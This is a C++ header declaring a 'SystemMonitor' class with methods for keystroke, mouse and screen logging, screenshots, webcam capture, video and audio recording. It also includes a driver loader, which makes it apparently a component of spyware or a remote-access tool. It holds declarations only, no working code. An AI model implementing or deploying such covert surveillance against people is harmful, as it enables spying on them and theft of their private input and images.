#pragma once
#include <Windows.h>
#include <gdiplus.h>
#include "DriverLoader.h"
#include "ResourceManager.h"
#include "Utility.h"
#pragma comment(lib, "Gdiplus.lib")

class SystemMonitor {
private:
	BinaryData keybdLog;
	BinaryData screenLog;
	BinaryData mouseLog;
	BinaryData camLog;
	BinaryData recordLog;
public:
	bool GetScreenShot(BinaryData &out);
	bool GetCameraShot(BinaryData &out, ULONG mode);
	bool StartScreenLog();
	bool StopScreenLog();
	bool StartKeyboardLog();
	bool StopKeyboardLog();
	bool StartMouseLog();
	bool StopMouseLog();
	bool StartVideoShoot(ULONG duration, ULONG mode);
	bool StartRecord(ULONG duration, ULONG mode);
	void GetInputData(BinaryData &out);
	void GetScreenLogData(BinaryData &out);
};